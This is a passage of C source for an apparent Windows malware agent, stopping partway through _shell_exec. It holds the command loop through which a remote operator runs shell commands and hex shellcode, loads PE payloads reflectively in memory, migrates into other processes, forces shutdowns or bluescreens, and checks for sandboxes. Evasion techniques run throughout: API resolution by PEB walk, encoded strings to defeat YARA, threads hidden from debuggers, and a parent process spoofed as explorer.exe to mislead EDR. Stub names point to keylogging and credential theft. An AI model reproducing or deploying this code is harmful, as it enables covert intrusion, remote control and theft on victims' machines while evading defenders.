            if (cbCmd != (DWORD)e->vlen &&
                cmd[e->vlen] != ' ' && cmd[e->vlen] != '\r' && cmd[e->vlen] != '\n')
                continue;
            e->fn(pTls, (cbCmd > (DWORD)e->vlen) ? cmd + e->vlen + 1 : "");
        }
        return TRUE;
    }
    return FALSE;
}


/* ── Public: shell_run ──────────────────────────────────────────────────── */

/* RVA → raw-file-offset helper used by stage_load's PE export scanner */
static DWORD _stage_rva2off(DWORD rva, const IMAGE_SECTION_HEADER *sec, WORD nSec)
{
    for (WORD i = 0; i < nSec; i++) {
        if (rva >= sec[i].VirtualAddress &&
            rva <  sec[i].VirtualAddress + sec[i].Misc.VirtualSize)
            return sec[i].PointerToRawData + (rva - sec[i].VirtualAddress);
    }
    return 0;
}

void shell_run(TLS_CONTEXT *pTls)
{
    inject_init();
    _jobs_init();   /* one-time CS init; idempotent */

    BYTE  *pCmd  = NULL;
    DWORD  cbCmd = 0;

    while (1) {
        if (pCmd) { free(pCmd); pCmd = NULL; cbCmd = 0; }

        if (!tls_recv_msg(pTls, &pCmd, &cbCmd))
            break;

        /* Strip JSON string wrapper ("cmd" → cmd) */
        cbCmd = _json_unwrap((char *)pCmd, cbCmd);
        const char *cmd = (const char *)pCmd;

        /* ── exit / q ──────────────────────────────────────────────────── */
        if (cbCmd >= 4 && strncmp("exit", cmd, 4) == 0) {
            free(pCmd); pCmd = NULL;
            tls_disconnect(pTls);
            return;
        }
        if (cbCmd == 1 && cmd[0] == 'q') {
            free(pCmd); pCmd = NULL;
            tls_disconnect(pTls);
            return;
        }

        /* ── Dispatch table (covers the majority of verbs) ─────────────── */
        /* Try the dispatch table first; if matched, free pCmd and continue. */
        if (_dispatch_verb(pTls, cmd, cbCmd)) {
            free(pCmd); pCmd = NULL;
            continue;
        }

        /* ── Complex/special-case verbs (not in the dispatch table) ────── */
        /* ls, env, services, dns_query, tail, write_file, find_files,      */
        /* migrate, forceOff, blueScreen, exec_bof, stage_load,             */
        /* sandbox_check, and _NS stubs remain here.                        */

        /* â”€â”€ ls [path] â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if ((cbCmd == 2 && strncmp("ls", cmd, 2) == 0) ||
            (cbCmd >= 3 && strncmp("ls ", cmd, 3) == 0)) {
            char path[MAX_PATH] = {0};
            if (cbCmd > 3) strncpy(path, cmd + 3, sizeof(path) - 1);
            free(pCmd); pCmd = NULL;
            _handle_ls(pTls, path[0] ? path : NULL);
            continue;
        }

        /* ── env [filter] ───────────────────────────────────────────────── */
        /* (kept here: optional filter argument cannot be expressed in table) */
        if ((cbCmd == 3 && strncmp("env", cmd, 3) == 0) ||
            (cbCmd >= 4 && strncmp("env ", cmd, 4) == 0)) {
            char filter[256] = {0};
            if (cbCmd > 4) strncpy(filter, cmd + 4, sizeof(filter) - 1);
            free(pCmd); pCmd = NULL;
            _handle_env(pTls, filter[0] ? filter : NULL);
            continue;
        }

        /* ── migrate <pid> ───────────────────────────────────────────────── */
        /* (special: calls tls_disconnect + ExitProcess on success)          */
        if (cbCmd >= 8 && strncmp("migrate ", cmd, 8) == 0) {
            char args[32] = {0};
            strncpy(args, cmd + 8, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            migrate_to_pid(pTls, args);
            return;
        }

        /* â”€â”€ forceOff() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 10 && strncmp("forceOff()", cmd, 10) == 0) {
            free(pCmd); pCmd = NULL;
            NTSTATUS ns1 = NtSetSystemPowerState(PowerActionShutdownOff,
                                                  PowerSystemShutdown,
                                                  SHTDN_REASON_MAJOR_HARDWARE |
                                                  SHTDN_REASON_MINOR_POWER_SUPPLY);
            NTSTATUS ns2 = NtShutdownSystem(ShutdownPowerOff);
            if (!NT_SUCCESS(ns1) && !NT_SUCCESS(ns2)) {
                char buf[80];
                _snprintf(buf, sizeof(buf) - 1,
                    "[-] forceOff: access denied (0x%08lX / 0x%08lX) â€” "
                    "need SeShutdownPrivilege",
                    (unsigned long)ns1, (unsigned long)ns2);
                _send_str(pTls, buf);
                continue;
            }
            return;
        }

        /* â”€â”€ blueScreen() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        if (cbCmd >= 12 && strncmp("blueScreen()", cmd, 12) == 0) {
            free(pCmd); pCmd = NULL;
            NTSTATUS ns = NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL,
                                            6, &g_hardErrorResponse);
            if (!NT_SUCCESS(ns)) {
                char buf[80];
                _snprintf(buf, sizeof(buf) - 1,
                    "[-] blueScreen: NtRaiseHardError failed (0x%08lX) â€” "
                    "need SeDebugPrivilege or SYSTEM",
                    (unsigned long)ns);
                _send_str(pTls, buf);
            }
            continue;
        }

        /* â"€â"€ Shell-command fallbacks â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€ */

        /* services [filter] â†' sc query / tasklist /svc
         * (kept here: optional filter argument needs special handling) */
        if (cbCmd >= 8 && strncmp("services", cmd, 8) == 0 &&
            (cbCmd == 8 || cmd[8] == ' ')) {
            char sub[MAX_PATH] = {0};
            char shellcmd[MAX_PATH + 32] = {0};
            if (cbCmd > 9) {
                strncpy(sub, cmd + 9, sizeof(sub) - 1);
                _snprintf(shellcmd, sizeof(shellcmd) - 1,
                    "sc query state= all | findstr /i \"%s\"", sub);
            } else {
                strncpy(shellcmd, "sc query state= all", sizeof(shellcmd) - 1);
            }
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* dns_query <host> → nslookup
         * Sanitise: accept only hostname/IP characters [A-Za-z0-9._:-].
         * Reject anything else to prevent shell metacharacter injection
         * (e.g. "8.8.8.8 & whoami" passing verbatim into cmd /c nslookup).
         * The host is also double-quoted in the command string as a second layer. */
        if (cbCmd >= 10 && strncmp("dns_query ", cmd, 10) == 0) {
            char host[256] = {0};
            strncpy(host, cmd + 10, sizeof(host) - 1);

            /* Validate: only alnum, dot, hyphen, colon (IPv6), underscore */
            BOOL safe = TRUE;
            for (int i = 0; host[i]; i++) {
                char c = host[i];
                if (!((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                      (c >= '0' && c <= '9') ||
                      c == '.' || c == '-' || c == ':' || c == '_')) {
                    safe = FALSE; break;
                }
            }
            free(pCmd); pCmd = NULL;
            if (!safe) {
                _send_str(pTls, "[-] dns_query: invalid hostname (only [A-Za-z0-9._:-] allowed)");
            } else {
                char shellcmd[300] = {0};
                _snprintf(shellcmd, sizeof(shellcmd) - 1, "nslookup \"%s\" 2>&1", host);
                _shell_exec(pTls, shellcmd);
            }
            continue;
        }

        /* exec_bof <hex-shellcode> [s:<str>|i:<int>|z:<short>|w:<str>|b:<hex>]
         * In-process shellcode execution with BOF-style argument packing.
         * W^X: alloc RW → write → RX → NtCreateThreadEx(HideFromDebugger)
         * Thread submitted via sc_threadpool_exec (TppWorkerThread call-stack). */
        if (cbCmd >= 9 && strncmp("exec_bof ", cmd, 9) == 0) {
            char *argsBuf = (char *)malloc(cbCmd);
            if (argsBuf) {
                strncpy(argsBuf, cmd + 9, cbCmd - 9);
                argsBuf[cbCmd - 9] = '\0';
                free(pCmd); pCmd = NULL;
                _handle_exec_bof(pTls, argsBuf);
                free(argsBuf);
            } else {
                free(pCmd); pCmd = NULL;
                _send_str(pTls, "[-] exec_bof: OOM");
            }
            continue;
        }

        /* sandbox_check — native Win32 (no wmic, no child process)
         * Checks: CPU core count, disk size, uptime, debugger presence, VM artefacts.
         * wmic.exe was deprecated in Win10 21H1 and removed in Win11 24H2. */
        if (cbCmd >= 13 && strncmp("sandbox_check", cmd, 13) == 0 &&
            (cbCmd == 13 || cmd[13] == ' ')) {
            free(pCmd); pCmd = NULL;
            {
                char buf[1024] = {0};
                int off = 0;

                /* CPU core count */
                SYSTEM_INFO si = {0};
                GetNativeSystemInfo(&si);
                off += _snprintf(buf + off, sizeof(buf) - off - 1,
                    "[CPU]     Processors : %lu\n", si.dwNumberOfProcessors);

                /* Total physical disk size (first fixed drive) */
                ULARGE_INTEGER freeBytes, totalBytes, totalFreeBytes;
                if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, &totalFreeBytes))
                    off += _snprintf(buf + off, sizeof(buf) - off - 1,
                        "[DISK]    C:\\ total  : %llu GB\n",
                        (unsigned long long)(totalBytes.QuadPart / (1024*1024*1024)));

                /* Uptime */
                ULONGLONG ms   = GetTickCount64();
                ULONGLONG days = ms / 86400000ULL;
                ULONGLONG hrs  = (ms % 86400000ULL) / 3600000ULL;
                ULONGLONG mins = (ms % 3600000ULL)  / 60000ULL;
                off += _snprintf(buf + off, sizeof(buf) - off - 1,
                    "[UPTIME]  %llud %lluh %llum\n", days, hrs, mins);

                /* Debugger */
                BOOL dbg = IsDebuggerPresent();
                BOOL rdbg = FALSE;
                CheckRemoteDebuggerPresent(GetCurrentProcess(), &rdbg);
                off += _snprintf(buf + off, sizeof(buf) - off - 1,
                    "[DEBUGGER] local=%s remote=%s\n",
                    dbg  ? "YES" : "no",
                    rdbg ? "YES" : "no");

                /* VM / sandbox heuristic: check for common VM registry keys.
                 * Key strings are decoded on-the-fly via SLIT_BUF — no plaintext
                 * appears in .rdata for YARA / strings(1) to match. */
                BOOL vm = FALSE;
                {
                    char _vmk0[80], _vmk1[32], _vmk2[40];
                    SLIT_BUF(_vmk0, sizeof(_vmk0),
                        "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0");
                    SLIT_BUF(_vmk1, sizeof(_vmk1),
                        "SOFTWARE\\VMware, Inc.\\VMware Tools");
                    SLIT_BUF(_vmk2, sizeof(_vmk2),
                        "SOFTWARE\\Oracle\\VirtualBox Guest Additions");
                    const char *vmKeys[3] = { _vmk0, _vmk1, _vmk2 };
                    for (int vi = 0; vi < 3 && !vm; vi++) {
                        HKEY hk = NULL;
                        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vmKeys[vi], 0, KEY_READ, &hk)
                                == ERROR_SUCCESS) {
                            vm = TRUE;
                            RegCloseKey(hk);
                        }
                    }
                }
                off += _snprintf(buf + off, sizeof(buf) - off - 1,
                    "[VM]      artefacts=%s\n", vm ? "YES" : "no");

                buf[off] = '\0';
                _send_str(pTls, buf);
            }
            continue;
        }

        /* find_files <path> <pattern> â†' dir /s /b */
        if (cbCmd >= 11 && strncmp("find_files ", cmd, 11) == 0) {
            char fpath[MAX_PATH] = {0};
            char fpat[128]       = {0};
            sscanf(cmd + 11, "%259s %127s", fpath, fpat);
            char shellcmd[MAX_PATH + 160] = {0};
            if (fpat[0])
                _snprintf(shellcmd, sizeof(shellcmd) - 1,
                    "dir /s /b \"%s\\%s\" 2>&1", fpath, fpat);
            else
                _snprintf(shellcmd, sizeof(shellcmd) - 1,
                    "dir /s /b \"%s\" 2>&1", fpath);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* tail <file> [n] â†' powershell Get-Content -Tail */
        if (cbCmd >= 5 && strncmp("tail ", cmd, 5) == 0) {
            char path[MAX_PATH] = {0};
            int  n = 20;
            sscanf(cmd + 5, "%259s %d", path, &n);
            char shellcmd[MAX_PATH + 64] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1,
                "powershell -NoProfile -Command \"Get-Content '%s' -Tail %d\" 2>&1",
                path, n);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* write_file <path> <content> â†’ echo > file */
        if (cbCmd >= 11 && strncmp("write_file ", cmd, 11) == 0) {
            char path[MAX_PATH] = {0};
            const char *rest = cmd + 11;
            /* first token is path, remainder is content */
            size_t pi = 0;
            while (*rest && *rest != ' ' && pi < MAX_PATH - 1) path[pi++] = *rest++;
            if (*rest == ' ') rest++;
            char shellcmd[MAX_PATH + 4096] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1,
                "powershell -NoProfile -Command "
                "\"Set-Content -Path '%s' -Value '%s'\" 2>&1",
                path, rest);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* ── Not-supported stubs ─────────────────────────────────────────── */
        /* Python-agent-only features: return a clear error rather than  */
        /* hanging on a recv_msg() that will never get a reply.          */

#define _NS(verb, vlen) \
        if (cbCmd >= (vlen) && strncmp((verb), cmd, (vlen)) == 0 && \
            (cbCmd == (vlen) || cmd[(vlen)] == ' ')) { \
            free(pCmd); pCmd = NULL; \
            _not_supported(pTls, (verb)); \
            continue; \
        }

        /* ── stage_load — receive a PE from C2 and run it in-memory ─────── */
        /*
         * Protocol:
         *   C2 sends: "stage_load"
         *   Agent replies: "STAGE_READY"
         *   C2 sends: raw PE bytes as one TLS frame (tls_send_msg)
         *   Agent: maps the PE via the reflective loader blob in a new thread,
         *          replies "[+] stage_load: running" and returns to the loop.
         *
         * No file is written to disk.  The PE runs inside the current process.
         * The loader calls AgentRun() in the new image — a second C2 loop
         * starts on a background thread.  Both the stager loop and the loaded
         * agent run concurrently; the stager should then call "exit" to clean up.
         */
        if (cbCmd >= 10 && strncmp("stage_load", cmd, 10) == 0 &&
            (cbCmd == 10 || cmd[10] == ' ')) {
            free(pCmd); pCmd = NULL;

            /* Tell C2 we are ready to receive the PE */
            _send_str(pTls, "STAGE_READY");

            /* Receive the PE bytes as a single TLS frame */
            BYTE  *pPE2  = NULL;
            DWORD  cbPE2 = 0;
            if (!tls_recv_msg(pTls, &pPE2, &cbPE2) || cbPE2 < 64) {
                if (pPE2) free(pPE2);
                _send_str(pTls, "[-] stage_load: recv failed");
                continue;
            }

            /* Verify MZ header */
            if (pPE2[0] != 'M' || pPE2[1] != 'Z') {
                free(pPE2);
                _send_str(pTls, "[-] stage_load: not a valid PE");
                continue;
            }

            /* Parse AgentRun RVA from PE export table */
            /* _pe_find_export is static in inject.c — duplicate a minimal scan
             * using the PE headers directly rather than calling across TU. */
            DWORD agentRva = 0;
            {
                IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)pPE2;
                if (cbPE2 > (DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64)) {
                    IMAGE_NT_HEADERS64 *nth =
                        (IMAGE_NT_HEADERS64 *)((BYTE *)pPE2 + dos->e_lfanew);
                    if (nth->OptionalHeader.Magic == 0x020B) {
                        DWORD expRVA = nth->OptionalHeader.DataDirectory[0].VirtualAddress;
                        IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nth);
                        WORD  nSec = nth->FileHeader.NumberOfSections;
                        /* RVA → file offset */
                        DWORD expOff = 0;
                        for (WORD si = 0; si < nSec; si++) {
                            if (expRVA >= sec[si].VirtualAddress &&
                                expRVA <  sec[si].VirtualAddress + sec[si].Misc.VirtualSize) {
                                expOff = sec[si].PointerToRawData +
                                         (expRVA - sec[si].VirtualAddress);
                                break;
                            }
                        }
                        if (expOff && expOff + sizeof(IMAGE_EXPORT_DIRECTORY) <= cbPE2) {
                            IMAGE_EXPORT_DIRECTORY *expDir =
                                (IMAGE_EXPORT_DIRECTORY *)((BYTE *)pPE2 + expOff);
                            DWORD nNames = expDir->NumberOfNames;
                            DWORD nameTableRVA = expDir->AddressOfNames;
                            DWORD addrTableRVA = expDir->AddressOfFunctions;
                            DWORD ordTableRVA  = expDir->AddressOfNameOrdinals;
                            /* RVA → raw-file-offset scan */
                            #define _R2F(rva) _stage_rva2off((rva), sec, nSec)
                            DWORD nOff = _R2F(nameTableRVA);
                            DWORD aOff = _R2F(addrTableRVA);
                            DWORD oOff = _R2F(ordTableRVA);
                            if (nOff && aOff && oOff) {
                                for (DWORD ni = 0; ni < nNames; ni++) {
                                    DWORD nRva;
                                    memcpy(&nRva, (BYTE *)pPE2 + nOff + ni*4, 4);
                                    DWORD nOff2 = _R2F(nRva);
                                    if (!nOff2 || nOff2 >= cbPE2) continue;
                                    if (strcmp((char *)((BYTE *)pPE2 + nOff2),
                                               "AgentRun") != 0) continue;
                                    WORD ord;
                                    memcpy(&ord, (BYTE *)pPE2 + oOff + ni*2, 2);
                                    memcpy(&agentRva, (BYTE *)pPE2 + aOff + ord*4, 4);
                                    break;
                                }
                            }
                            #undef _R2F
                        }
                    }
                }
            }

            if (!agentRva) {
                free(pPE2);
                _send_str(pTls, "[-] stage_load: AgentRun export not found");
                continue;
            }

            /* Resolve kernel32 API pointers via PEB walk — no IAT entries (G-03) */
            PVOID hK32sl = peb_get_module(peb_hash_str("kernel32.dll"));
            typedef LPVOID (WINAPI *pVA2_t)(LPVOID,SIZE_T,DWORD,DWORD);
            typedef BOOL   (WINAPI *pFIC2_t)(HANDLE,LPCVOID,SIZE_T);
            typedef HMODULE(WINAPI *pLL2_t)(LPCSTR);
            typedef FARPROC(WINAPI *pGP2_t)(HMODULE,LPCSTR);
            typedef HANDLE (WINAPI *pCT2_t)(LPSECURITY_ATTRIBUTES,SIZE_T,
                                             LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
            typedef BOOL   (WINAPI *pCH2_t)(HANDLE);
            pVA2_t  pVA2  = (pVA2_t) (void *)peb_get_export(hK32sl,peb_hash_str("VirtualAlloc"));
            pFIC2_t pFIC2 = (pFIC2_t)(void *)peb_get_export(hK32sl,peb_hash_str("FlushInstructionCache"));
            pLL2_t  pLL2  = (pLL2_t) (void *)peb_get_export(hK32sl,peb_hash_str("LoadLibraryA"));
            pGP2_t  pGP2  = (pGP2_t) (void *)peb_get_export(hK32sl,peb_hash_str("GetProcAddress"));
            pCT2_t  pCT2  = (pCT2_t) (void *)peb_get_export(hK32sl,peb_hash_str("CreateThread"));
            pCH2_t  pCH2  = (pCH2_t) (void *)peb_get_export(hK32sl,peb_hash_str("CloseHandle"));

            if (!pVA2 || !pFIC2 || !pLL2 || !pGP2 || !pCT2 || !pCH2) {
                free(pPE2);
                _send_str(pTls, "[-] stage_load: kernel32 resolution failed");
                continue;
            }

            /* Build RflData for in-process reflective load */
            extern char g_key_path[];
            RflData rfdS;
            ZeroMemory(&rfdS, sizeof(rfdS));
            rfdS.rawSize              = cbPE2;
            rfdS.agentRunRva          = agentRva;
            rfdS.gKeyPathOffset       = 0;    /* in-process: g_key_path already set */
            rfdS.gKeyPathSize         = 0;
            strncpy(rfdS.keyPath, g_key_path, sizeof(rfdS.keyPath) - 1);
            rfdS.pVirtualAlloc         = pVA2;
            rfdS.pFlushInstructionCache= pFIC2;
            rfdS.pLoadLibraryA         = pLL2;
            rfdS.pGetProcAddress       = pGP2;
            rfdS.pCreateThread         = pCT2;
            rfdS.pCloseHandle          = pCH2;

            /* Allocate RW region in current process: [loader | RflData | PE]
             * No trampoline needed — in-process launch uses sc_threadpool_exec
             * which produces ntdll!TppWorkerThread at the top of the stack.  */
            SIZE_T cbLs  = (SIZE_T)S_RFL_LOADER_SIZE;
            SIZE_T cbRs  = sizeof(RflData);
            SIZE_T cbTs  = cbLs + cbRs + (SIZE_T)cbPE2;
            PVOID  pRemS = NULL;
            NTSTATUS nsS = SC_NtAllocateVirtualMemory(
                GetCurrentProcess(), &pRemS, 0, &cbTs,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (!NT_SUCCESS(nsS)) {
                free(pPE2);
                _send_str(pTls, "[-] stage_load: alloc failed");
                continue;
            }

            rfdS.pRawPE = (unsigned char *)((BYTE *)pRemS + cbLs + cbRs);

            /* Build flat buffer and write into the allocation */
            memcpy((BYTE *)pRemS,            s_rfl_loader, cbLs);
            memcpy((BYTE *)pRemS + cbLs,     &rfdS,        cbRs);
            memcpy((BYTE *)pRemS + cbLs + cbRs, pPE2,      cbPE2);
            free(pPE2);

            /* Flip loader region RW → RX */
            PVOID  pBS = pRemS;
            SIZE_T cPS = cbLs;
            ULONG  oPS = 0;
            SC_NtProtectVirtualMemory(GetCurrentProcess(), &pBS, &cPS,
                                      PAGE_EXECUTE_READ, &oPS);

            /* Launch loader in-process.
             * Primary: sc_threadpool_exec → ntdll!TppWorkerThread call-stack.
             * Fallback: NtCreateThreadEx with HIDE_FROM_DEBUGGER flag.        */
            PVOID  pArgS = (BYTE *)pRemS + cbLs;
            BOOL   launched;
            launched = sc_threadpool_exec((LPTHREAD_START_ROUTINE)pRemS, pArgS);
            if (!launched) {
                HANDLE hThS  = NULL;
                NTSTATUS nsT = SC_NtCreateThreadEx(
                    &hThS, THREAD_ALL_ACCESS, NULL,
                    GetCurrentProcess(), pRemS, pArgS,
                    THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                    0, 0, 0, NULL);
                launched = NT_SUCCESS(nsT) && hThS;
                if (launched) SC_NtClose(hThS);
            }

            if (launched) {
                _send_str(pTls, "[+] stage_load: PE loaded in-memory, AgentRun started");
            } else {
                _send_str(pTls, "[-] stage_load: thread creation failed");
            }
            continue;
        }

        _NS("screenshot",         10)
        _NS("screenshot_region",  17)
        _NS("screenshot_timelapse", 21)
        _NS("screenrecord",       12)
        _NS("screen_stream",      13)
        _NS("webcam",              6)
        _NS("record",              6)
        _NS("mic_level",           9)
        _NS("keylog_start",       12)
        _NS("keylog_dump",        11)
        _NS("keylog_stop",        11)
        _NS("browser_history",    15)
        _NS("browser_creds",      13)
        /* inject_shellcode <pid> <hex> — alias for "inject" (in dispatch table) */
        /* dll_inject <pid>            — alias for "migrate" */
        if (cbCmd >= 11 && strncmp("dll_inject ", cmd, 11) == 0) {
            char args[32] = {0};
            strncpy(args, cmd + 11, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            migrate_to_pid(pTls, args);
            return;
        }
        _NS("reverse_shell",      13)
        _NS("socks5",              6)
        _NS("portfwd",             7)
        _NS("cred_vault",         10)
        _NS("ssh_harvest",        11)
        _NS("sudo_sniff",         10)
        _NS("sudo_sniff_read",    15)
        _NS("sudo_sniff_clean",   16)
        _NS("notify",              6)
        _NS("play_sound",         10)
        _NS("forkbomb",            8)
        _NS("living_off_land",    15)
        _NS("zip_download",       12)
        _NS("zip_upload",         10)
        _NS("run_python",          10)
        _NS("pty_shell",           9)
        _NS("load_extension",     14)
        _NS("unload_extension",   16)
        _NS("irb",                 3)
        _NS("kiwi",                4)

#undef _NS

        /* â”€â”€ Shell fallback â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        char *cmdCopy = (char *)malloc(cbCmd + 1);
        if (cmdCopy) {
            memcpy(cmdCopy, cmd, cbCmd);
            cmdCopy[cbCmd] = '\0';
        }
        free(pCmd); pCmd = NULL;
        if (cmdCopy) {
            _shell_exec(pTls, cmdCopy);
            free(cmdCopy);
        }
    }

    if (pCmd) free(pCmd);

    /* Null out pTls in all live job slots so background workers that are
     * still running (blocked on ReadFile) do not send notifications to a
     * stale TLS_CONTEXT that may belong to the next session.             */
    if (g_cs_init) {
        EnterCriticalSection(&g_tls_cs);
        for (int _i = 0; _i < JOB_MAX; _i++) {
            if (g_jobs[_i].state != JOB_FREE)
                g_jobs[_i].pTls = NULL;
        }
        LeaveCriticalSection(&g_tls_cs);
    }
}


/* â”€â”€ _send_str â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

void _send_str(TLS_CONTEXT *pTls, const char *msg)
{
    if (!msg) msg = "";
    size_t len = strlen(msg);
    /* Acquire the TLS send lock so background job threads cannot interleave
     * their "job done" notifications with in-progress handler responses.   */
    if (g_cs_init) EnterCriticalSection(&g_tls_cs);
    tls_send_msg(pTls, (const BYTE *)(len ? msg : " "), (DWORD)(len ? len : 1));
    if (g_cs_init) LeaveCriticalSection(&g_tls_cs);
}


/* â”€â”€ _not_supported â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

void _not_supported(TLS_CONTEXT *pTls, const char *verb)
{
    char buf[128];
    _snprintf(buf, sizeof(buf) - 1,
        "[-] %s: not supported by C agent (Python agent only)", verb);
    _send_str(pTls, buf);
}


/* â”€â”€ _shell_exec â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

void _shell_exec(TLS_CONTEXT *pTls, const char *cmd)
{
    /*
     * CreateProcess + anonymous pipe, no _popen.
     *
     * Evasion:
     *   1. CREATE_NO_WINDOW  — no console window created or visible.
     *   2. PPID spoof via UpdateProcThreadAttribute(PARENT_PROCESS) — the
     *      child appears in EDR process trees as a child of explorer.exe.
     *      Graceful fallback if explorer.exe cannot be opened.
     *   3. Pipe read end not inherited; write end closed after CreateProcess
     *      so ReadFile returns naturally on child exit (EOF).
     */

    /* ── Build "cmd /c <command>" ────────────────────────────────────── */
    size_t cmdLen  = strlen(cmd);
    char  *fullCmd = (char *)malloc(cmdLen + 16);
    if (!fullCmd) { _send_str(pTls, "[-] out of memory"); return; }
    _snprintf(fullCmd, cmdLen + 15, "cmd /c %s", cmd);

    /* ── Anonymous pipe ──────────────────────────────────────────────── */
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        free(fullCmd);
        _send_str(pTls, "[-] _shell_exec: CreatePipe failed");
        return;
    }
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    /* ── PPID spoof: find explorer.exe via NtQuerySystemInformation ──── */
    HANDLE hExplorer = NULL;
    {
        /* Use NtQSI instead of CreateToolhelp32Snapshot to avoid the
         * high-signal kernel callback that all major EDRs hook.          */
        ULONG _spi_sz = 0;
        SC_NtQuerySystemInformation(5, NULL, 0, &_spi_sz);
        if (_spi_sz == 0) _spi_sz = 512 * 1024;
        _spi_sz += 65536;
        BYTE *_spi = (BYTE *)malloc(_spi_sz);
        if (_spi) {
            ULONG _spi_ret = 0;
            if (NT_SUCCESS(SC_NtQuerySystemInformation(5, _spi, _spi_sz, &_spi_ret))) {
                static const WCHAR _expl[] = L"explorer.exe";
                const BYTE *_q = _spi;
                for (;;) {
                    ULONG  _no; USHORT _nl; PVOID _nb; HANDLE _pid;
                    memcpy(&_no, _q + 0x00, 4);
                    memcpy(&_nl, _q + 0x38, 2);
                    memcpy(&_nb, _q + 0x40, sizeof(PVOID));
                    memcpy(&_pid, _q + 0x60, sizeof(HANDLE));
                    if (_nl == sizeof(_expl) - sizeof(WCHAR) && _nb) {
                        WCHAR _nm[16] = {0};
                        SIZE_T _cp = _nl < sizeof(_nm)-2 ? _nl : sizeof(_nm)-2;
                        memcpy(_nm, _nb, _cp);
                        if (_wcsicmp(_nm, _expl) == 0) {
                            hExplorer = k32_OpenProcess(PROCESS_CREATE_PROCESS,
                                                        FALSE,
                                                        (DWORD)(ULONG_PTR)_pid);
                            if (hExplorer) break;
                        }
                    }
                    if (_no == 0) break;
                    _q += _no;
                }
            }
            free(_spi);
        }
    }

    /* ── STARTUPINFOEX + attribute list ─────────────────────────────── */
    STARTUPINFOEXA      sie;
    PROCESS_INFORMATION pi;
    ZeroMemory(&sie, sizeof(sie));
    ZeroMemory(&pi,  sizeof(pi));
    sie.StartupInfo.cb         = sizeof(sie);
    sie.StartupInfo.dwFlags    = STARTF_USESTDHANDLES;
    sie.StartupInfo.hStdOutput = hWritePipe;
    sie.StartupInfo.hStdError  = hWritePipe;
    sie.StartupInfo.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    BOOL   useAttr     = FALSE;
    SIZE_T attrListSz  = 0;
    if (hExplorer) {
        InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSz);
        sie.lpAttributeList =
            (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attrListSz);
        if (sie.lpAttributeList &&
            InitializeProcThreadAttributeList(
                sie.lpAttributeList, 1, 0, &attrListSz) &&
            UpdateProcThreadAttribute(
                sie.lpAttributeList, 0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                &hExplorer, sizeof(hExplorer), NULL, NULL)) {
            useAttr = TRUE;
        } else {
            free(sie.lpAttributeList);
            sie.lpAttributeList = NULL;
        }
    }

